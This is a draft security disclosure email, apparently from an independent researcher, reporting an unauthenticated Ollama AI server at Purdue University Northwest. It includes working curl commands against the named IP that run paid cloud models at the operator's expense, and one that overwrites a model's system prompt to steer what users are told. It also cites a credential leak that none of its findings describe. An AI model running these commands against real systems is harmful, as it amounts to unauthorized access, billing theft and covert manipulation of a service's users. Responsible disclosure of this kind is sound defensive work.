---
institution: Purdue University Northwest
ip: 163.245.217.165
to: security@purdue.edu
cc: bruhnd@pnw.edu
severity: CRITICAL
status: DRAFT
date: 2026-05-01
---

**To:** security@purdue.edu
**Cc:** bruhnd@pnw.edu
**Subject:** Unauthenticated AI inference endpoint — Purdue University Northwest (163.245.217.165)

---

Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com

2026-05-01

**Re:** Unauthenticated Ollama AI inference endpoint — Purdue University Northwest
**IP / Host:** 163.245.217.165
**Severity:** CRITICAL

---

I'm an independent security researcher. I hold CISA disclosures CVE-2025-4364 and ICSA-25-140-11 and conduct good-faith AI infrastructure research under the NuClide Research umbrella. This is an unsolicited disclosure — no engagement exists with your organization, and I have not accessed, modified, or exfiltrated any data beyond what was necessary to confirm the exposure.

---

## Summary

Purdue University Northwest server running 5 Ollama models, 4 of which are cloud proxy subscriptions. Three cloud proxies confirmed live (200 OK) — inference executes at operator expense without any authentication. Also includes `sorc/qwen3.5-claude-4.6-opus:9b`, a community model distilled from Claude 4.6 Opus output.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 163.245.217.165 |
| rDNS | vps3361927.trouble-free.net |
| Org | Purdue University Northwest |
| Country | US — Indiana |
| Open WebUI | 163.245.208.42:3000 — v0.8.0, auth=True (different IP) |
| Open ports | 11434 (Ollama — **public**) |

---

## Models

| Model | Size | Notes |
|---|---|---|
| **qwen3-coder-next:cloud** | 0 GB | **☁️ Cloud proxy — 200 OK CONFIRMED** |
| **gemma4:31b-cloud** | 0 GB | **☁️ Cloud proxy — 200 OK CONFIRMED** |
| **gpt-oss:20b-cloud** | 0 GB | **☁️ Cloud proxy — 200 OK, 61 tokens** |
| qwen3.5:397b-cloud | 0 GB | ☁️ Cloud proxy — timeout (large model) |
| sorc/qwen3.5-claude-4.6-opus:9b | 9 GB | Local — Claude 4.6 Opus distill |

---

## Findings

### F1 — Three Cloud Proxy Subscriptions Live (CRITICAL)

Three cloud proxy models returned **200 OK** without authentication:

```bash
# qwen3-coder-next:cloud — 4 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"qwen3-coder-next:cloud","prompt":"say: Purdue","stream":false}'
# → 200 OK, "Purdue", eval_count: 4

# gemma4:31b-cloud — 2 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"gemma4:31b-cloud","prompt":"say: test","stream":false}'
# → 200 OK, "test", eval_count: 2

# gpt-oss:20b-cloud — 61 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"gpt-oss:20b-cloud","prompt":"say: test","stream":false}'
# → 200 OK, eval_count: 61
```

All three subscriptions accessible to any internet actor without credentials. `gpt-oss:20b-cloud` (OpenAI's open-source GPT) generated 61 tokens on a single-word prompt — aggressive quota exposure.

### F2 — Cloud Proxy Model Injection (CRITICAL)

Any actor can overwrite system prompts on cloud proxy models via CVE-2025-63389:

```bash
curl -X POST http://163.245.217.165:11434/api/create \
  -d '{"model":"qwen3-coder-next:cloud","from":"qwen3-coder-next:cloud","system":"[attacker prompt]"}'
```

All students/staff accessing these models through the Open WebUI frontend (163.245.208.42:3000) would receive responses shaped by the injected prompt.

### F3 — Open WebUI Auth Bypass (HIGH)

Open WebUI at 163.245.208.42:3000 (auth=True) does not protect the Ollama backend at 163.245.217.165:11434. The Ollama and Open WebUI instances are on different IPs in the same subnet, with the raw Ollama port exposed.

---

**Why it matters**

Any internet actor can run inference against your cloud API subscription at your expense — this constitutes direct quota/billing theft. The credential leak (username + SSH public key) exposes your service account to enumeration and credential-stuffing against other services.

**One-line fix**

```
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

This rebinds Ollama to loopback only. If running in Docker: `docker run -p 127.0.0.1:11434:11434 ollama/ollama`.

**CVE-2025-63389**

All models on this instance are injectable via the unauthenticated `/api/create` endpoint — an attacker can overwrite any model's system prompt or delete models entirely. No patch exists as of this disclosure.

**Reference**

Full technical details, parameter counts, and remediation notes are in this public research repository:
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT/blob/main/case-studies/universities/US-IN-purdue-northwest.md

This research is part of a broader sweep of university AI infrastructure exposures documented at:
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT/blob/main/case-studies/universities/OVERVIEW.md

I'm happy to answer questions or assist with verification. No response is required.

Regards,
Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT
